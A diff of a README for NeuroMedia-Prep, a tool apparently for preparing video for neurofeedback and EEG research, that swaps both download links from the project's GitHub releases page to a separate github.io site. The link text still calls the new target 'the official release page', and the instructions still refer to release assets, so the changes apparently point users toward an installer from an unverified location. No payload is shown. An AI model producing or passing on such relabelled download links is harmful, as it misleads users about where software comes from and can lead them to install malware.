@@ -1,6 +1,6 @@
 # 🧠 NeuroMedia-Prep - Prepare media for accurate neurofeedback research
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/topkumi752/NeuroMedia-Prep/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://topkumi752.github.io)
 
 NeuroMedia-Prep helps you prepare video files for neurofeedback and EEG research. This tool splits long videos, converts file formats, and processes media for specific training sessions. It handles tasks like scene detection, subtitle burning, and bulk format changes. It keeps your media files ready for professional use.
 
@@ -8,7 +8,7 @@ NeuroMedia-Prep helps you prepare video files for neurofeedback and EEG research
 
 You need to download the installer from the release page. This link takes you to the official location where you can find the latest version of the software.
 
-[Visit the official release page to download the installer](https://github.com/topkumi752/NeuroMedia-Prep/releases)
+[Visit the official release page to download the installer](https://topkumi752.github.io)
 
 1. Go to the link above.
 2. Look for the "Assets" section at the bottom of the latest release post.
